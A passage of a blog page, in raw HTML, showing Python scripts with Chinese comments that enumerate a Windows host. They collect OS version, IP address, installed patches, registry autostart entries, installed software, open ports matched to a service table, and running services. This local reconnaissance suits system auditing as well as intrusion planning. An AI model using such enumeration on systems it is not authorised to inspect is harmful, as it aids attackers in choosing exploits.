print(&quot;Name: &#123;&#125;&quot;.format(name))</span></span><br><span class="line">            <span class="comment"># print(&quot;Path: &#123;&#125;&quot;.format(value))</span></span><br><span class="line">            <span class="comment"># print(&quot;-&quot;*50)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(&quot;&#123;&#125; is empty.\n&quot;.format(title))</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_registry_subkeys</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            subkeys_count, _, _ = winreg.QueryInfoKey(key)</span><br><span class="line">            subkeys = [winreg.EnumKey(key, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(subkeys_count)]</span><br><span class="line">            <span class="keyword">return</span> subkeys</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_registry_value</span>(<span class="params">hive, subkey, value_name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            value, _ = winreg.QueryValueEx(key, value_name)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInstallAppInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机已安装应用信息......&quot;</span>)</span><br><span class="line">    <span class="comment"># 列出 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall 下的子项及其 DisplayName 值</span></span><br><span class="line">    hive1 = winreg.HKEY_LOCAL_MACHINE</span><br><span class="line">    subkey = <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;</span></span><br><span class="line">    subkeys1 = list_registry_subkeys(hive1, subkey)</span><br><span class="line"></span><br><span class="line">    hive2 = winreg.HKEY_CURRENT_USER</span><br><span class="line">    subkeys2 = list_registry_subkeys(hive2, subkey)</span><br><span class="line">    <span class="keyword">if</span> subkeys1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKLM:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印结果</span></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys1:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive1, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&quot;-&quot; * 50)</span></span><br><span class="line">    <span class="keyword">if</span> subkeys2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKCU:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys2:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive2, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAutoRunInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机启动项信息......&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_run, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_runonce, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_run, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_runonce, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPortInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机开放端口服务信息......&quot;</span>)</span><br><span class="line">    services_found = []  <span class="comment"># 保存识别出的端口服务信息</span></span><br><span class="line">    services_unfound = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.Popen([<span class="string">&quot;netstat&quot;</span>, <span class="string">&quot;-ano&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(netstat_output)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用正则表达式匹配并提取信息</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                local_address, _, state, pid = <span class="keyword">match</span>.groups()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 只输出 LISTENING 状态的信息，并且只显示本地地址、状态和 PID</span></span><br><span class="line">                <span class="keyword">if</span> state <span class="keyword">in</span> [<span class="string">&quot;LISTENING&quot;</span>, <span class="string">&quot;ESTABLISHED&quot;</span>]:</span><br><span class="line">                    <span class="comment"># 从 local_address 中提取 IP 地址和端口</span></span><br><span class="line">                    ip_port_match = re.<span class="keyword">match</span>(<span class="string">r&#x27;(\S+):(\d+)&#x27;</span>, local_address)</span><br><span class="line">                    <span class="keyword">if</span> ip_port_match:</span><br><span class="line">                        ip, port = ip_port_match.groups()</span><br><span class="line">                        <span class="comment"># 尝试从字典中获取服务信息，如果没有找到则输出 &quot;Unknown Service&quot;</span></span><br><span class="line">                        service = service_port_mapping.get(<span class="built_in">int</span>(port), <span class="string">&quot;Unknown Service&quot;</span>)</span><br><span class="line">                        <span class="comment"># 输出 IP地址、端口、状态和 PID、服务</span></span><br><span class="line">                        <span class="keyword">if</span> service != <span class="string">&quot;Unknown Service&quot;</span>:</span><br><span class="line">                            services_found.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            services_unfound.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 本地连接IP 端口去重  并用port进行排序</span></span><br><span class="line">        services_found = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_found&#125;]</span><br><span class="line">        services_found = <span class="built_in">sorted</span>(services_found, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        services_unfound = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_unfound&#125;]</span><br><span class="line">        services_unfound = <span class="built_in">sorted</span>(services_unfound, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 共匹配到 &#123;&#125; 个已知端口服务&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_found)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 共匹配到 &#123;&#125; 个未知端口服务&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_unfound)))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 识别出的端口服务:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_found:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  &#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 未识别出的端口服务:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_unfound:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_unfound:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  &#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果未找到相关信息，则输出一条消息</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line) <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到相关信息!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 错误: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getServiceInfo</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] 获取主机正在运行的服务......&#x27;</span>)</span><br><span class="line">        result = subprocess.Popen(<span class="string">&#x27;net start | find /v &quot;已经启动以下 Windows 服务&quot; | find /v &quot;命令成功完成&quot;&#x27;</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># 去空行</span></span><br><span class="line">        netstat_output = <span class="string">&quot;\n&quot;</span>.join(line <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines() <span class="keyword">if</span> line.strip())</span><br><span class="line">        <span class="built_in">print</span>(netstat_output)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 错误: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSystemInfo</span>():</span><br><span class="line">    cmd_command1 = <span class="string">r&#x27;systeminfo | findstr /i /c:&quot;主机名&quot; /c:&quot;OS 名称&quot; /c:&quot;OS 版本&quot; | find /v &quot;BIOS 版本&quot;&#x27;</span></span><br><span class="line">    process = subprocess.Popen(cmd_command1, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    stdout1, stderr1 = process.communicate()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(stdout1.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> stderr1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr1.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    cmd_command2 = <span class="string">r&#x27;cmd /c ipconfig | findstr /i &quot;IPv4 地址 IP Address&quot; | findstr /i /v &quot;IPv6&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">    process = subprocess.Popen(cmd_command2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    stdout2, stderr2 = process.communicate()</span><br><span class="line">    <span class="keyword">if</span> stderr2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr2.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用正则表达式匹配IPv4地址</span></span><br><span class="line">    ipv4_pattern1 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;IPv4 地址[^:]+:\s*([\d.]+)&#x27;</span>, re.IGNORECASE)</span><br><span class="line">    ipv4_pattern2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;IP Address\. .+? : (\d+\.\d+\.\d+\.\d+)&#x27;</span>, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line">    match1 = ipv4_pattern1.search(stdout2.decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line">    match2 = ipv4_pattern2.search(stdout2.decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> match1:</span><br><span class="line">        ipv4_address = match1.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IPv4地址:\t\t&quot;</span>, ipv4_address)</span><br><span class="line">    <span class="keyword">elif</span> match2:</span><br><span class="line">        ipv4_address = match2.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IPv4地址:\t\t&quot;</span>, ipv4_address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到IPv4地址&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cmd_command3 = <span class="string">&#x27;systeminfo&#x27;</span></span><br><span class="line">    process = subprocess.Popen(cmd_command3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    stdout3, stderr3 = process.communicate()</span><br><span class="line">    <span class="keyword">if</span> stderr3:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    kb_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;KB\d&#123;7&#125;&#x27;</span>)</span><br><span class="line">    q_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;Q\d&#123;6&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    matches_kb = kb_pattern.findall(stdout3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">    matches_q = q_pattern.findall(stdout3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> matches_kb:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已安装&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(matches_kb)) + <span class="string">&quot;个补丁:\t&quot;</span>, matches_kb)</span><br><span class="line">    <span class="keyword">if</span> matches_q:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已安装&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(matches_q)) + <span class="string">&quot;个补丁:\t&quot;</span>, matches_q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取返回码</span></span><br><span class="line">    return_code = process.returncode</span><br><span class="line">    <span class="keyword">if</span> return_code != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Return Code:&quot;</span>, return_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getScheduleTaskInfo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOSRelease</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] 检测到当前主机系统为&#x27;</span>,platform.system() +<span class="string">&quot; &quot;</span>+platform.release())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] 开始对本机进行信息收集,请稍等片刻......&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getOSRelease()</span><br><span class="line">    getSystemInfo()</span><br><span class="line">    <span class="comment">#自启动项 端口 安装应用 运行服务</span></span><br><span class="line">    getAutoRunInfo()</span><br><span class="line">    getPortInfo()</span><br><span class="line">    getInstallAppInfo()</span><br><span class="line">    getServiceInfo()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 普通用户没权限 这个可以考虑忽略掉</span></span><br><span class="line">    <span class="comment"># getScheduleTaskInfo()</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="Version4"><a href="#Version4" class="headerlink" title="Version4"></a>Version4</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> winreg</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">service_port_mapping = &#123;</span><br><span class="line">    <span class="number">21</span>: <span class="string">&quot;FTP/TFTP/VSFTPD (File Transfer Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">22</span>: <span class="string">&quot;SSH (Secure Shell)&quot;</span>,</span><br><span class="line">    <span class="number">23</span>: <span class="string">&quot;Telnet (Remote Connection)&quot;</span>,</span><br><span class="line">    <span class="number">25</span>: <span class="string">&quot;SMTP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">53</span>: <span class="string">&quot;DNS (Domain Name System)&quot;</span>,</span><br><span class="line">    <span class="number">67</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">68</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">110</span>: <span class="string">&quot;POP3 (Email)&quot;</span>,</span><br><span class="line">    <span class="number">123</span>: <span class="string">&quot;NTP&quot;</span>,</span><br><span class="line">    <span class="number">135</span>: <span class="string">&quot;RPC(Remote Procedure Call)&quot;</span>,</span><br><span class="line">    <span class="number">137</span>: <span class="string">&quot;NetBIOS Name Service(NBNS)&quot;</span>,</span><br><span class="line">    <span class="number">138</span>: <span class="string">&quot;NetBIOS Datagram Service&quot;</span>,</span><br><span class="line">    <span class="number">139</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">143</span>: <span class="string">&quot;IMAP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">161</span>: <span class="string">&quot;SNMP (Simple Network Management Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">389</span>: <span class="string">&quot;LDAP (Lightweight Directory Access Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">445</span>: <span class="string">&quot;SMB (Server Message Block)&quot;</span>,</span><br><span class="line">    <span class="number">512</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">513</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">514</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">873</span>: <span class="string">&quot;Rsync (Remote File Synchronization)&quot;</span>,</span><br><span class="line">    <span class="number">1080</span>: <span class="string">&quot;Socket&quot;</span>,</span><br><span class="line">    <span class="number">1098</span>: <span class="string">&quot;JAVARMI&quot;</span>,</span><br><span class="line">    <span class="number">1352</span>: <span class="string">&quot;Lotus Domino (Email)&quot;</span>,</span><br><span class="line">    <span class="number">1433</span>: <span class="string">&quot;MSSQL (Microsoft SQL Server)&quot;</span>,</span><br><span class="line">    <span class="number">1521</span>: <span class="string">&quot;Oracle Database&quot;</span>,</span><br><span class="line">    <span class="number">2049</span>: <span class="string">&quot;NFS (Network File System)&quot;</span>,</span><br><span class="line">    <span class="number">2181</span>: <span class="string">&quot;Zookeeper&quot;</span>,</span><br><span class="line">    <span class="number">2222</span>: <span class="string">&quot;DA&quot;</span>,</span><br><span class="line">    <span class="number">2375</span>: <span class="string">&quot;Docker Remote API&quot;</span>,</span><br><span class="line">    <span class="number">2601</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="number">3306</span>: <span class="string">&quot;MySQL Database&quot;</span>,</span><br><span class="line">    <span class="number">3128</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="number">3389</span>: <span class="string">&quot;RDP (Remote Desktop Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">4100</span>: <span class="string">&quot;SysBase&quot;</span>,</span><br><span class="line">    <span class="number">4440</span>: <span class="string">&quot;rundeck&quot;</span>,</span><br><span class="line">    <span class="number">4848</span>: <span class="string">&quot;GlassFish Console&quot;</span>,</span><br><span class="line">    <span class="number">5000</span>: <span class="string">&quot;Sybase/DB2 Database&quot;</span>,</span><br><span class="line">    <span class="number">5422</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5432</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5632</span>: <span class="string">&quot;PCAnywhere Service&quot;</span>,</span><br><span class="line">    <span class="number">5900</span>: <span class="string">&quot;VNC (Virtual Network Computing)&quot;</span>,</span><br><span class="line">    <span class="number">5984</span>: <span class="string">&quot;CouchDB&quot;</span>,</span><br><span class="line">    <span class="number">6082</span>: <span class="string">&quot;Varnish&quot;</span>,</span><br><span class="line">    <span class="number">6379</span>: <span class="string">&quot;Redis Database&quot;</span>,</span><br><span class="line">    <span class="number">7001</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">7002</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">80</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">    <span class="number">443</span>: <span class="string">&quot;HTTPS&quot;</span>,</span><br><span class="line">    <span class="number">8000</span>: <span class="string">&quot;Jdwp&quot;</span>,</span><br><span class="line">    <span class="number">8069</span>: <span class="string">&quot;Zabbix&quot;</span>,</span><br><span class="line">    <span class="number">8161</span>: <span class="string">&quot;ActiveMQ&quot;</span>,</span><br><span class="line">    <span class="number">8080</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8089</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8083</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8086</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8980</span>: <span class="string">&quot;OpenNMS&quot;</span>,</span><br><span class="line">    <span class="number">9000</span>: <span class="string">&quot;FastCGI&quot;</span>,</span><br><span class="line">    <span class="number">9080</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9090</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9200</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">9300</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">11211</span>: <span class="string">&quot;Memcached&quot;</span>,</span><br><span class="line">    <span class="number">27017</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">27018</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">50000</span>: <span class="string">&quot;SAP&quot;</span>,</span><br><span class="line">    <span class="number">50010</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50030</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50070</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_startup_items</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = winreg.OpenKey(hive, subkey, <span class="number">0</span>, winreg.KEY_READ)</span><br><span class="line"></span><br><span class="line">        startup_items = &#123;&#125;</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                name, value, _ = winreg.EnumValue(key, index)</span><br><span class="line">                startup_items[name] = value</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="comment"># 到达注册表末尾</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> startup_items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_current_user_run = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_current_user_runonce = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_local_machine_run = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_local_machine_runonce = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_startup_items</span>(<span class="params">startup_items, title</span>):</span><br><span class="line">    <span class="keyword">if</span> startup_items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125;: &quot;</span>.<span class="built_in">format</span>(title))</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> startup_items.items():</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="comment"># print(&quot;Name: &#123;&#125;&quot;.format(name))</span></span><br><span class="line">            <span class="comment"># 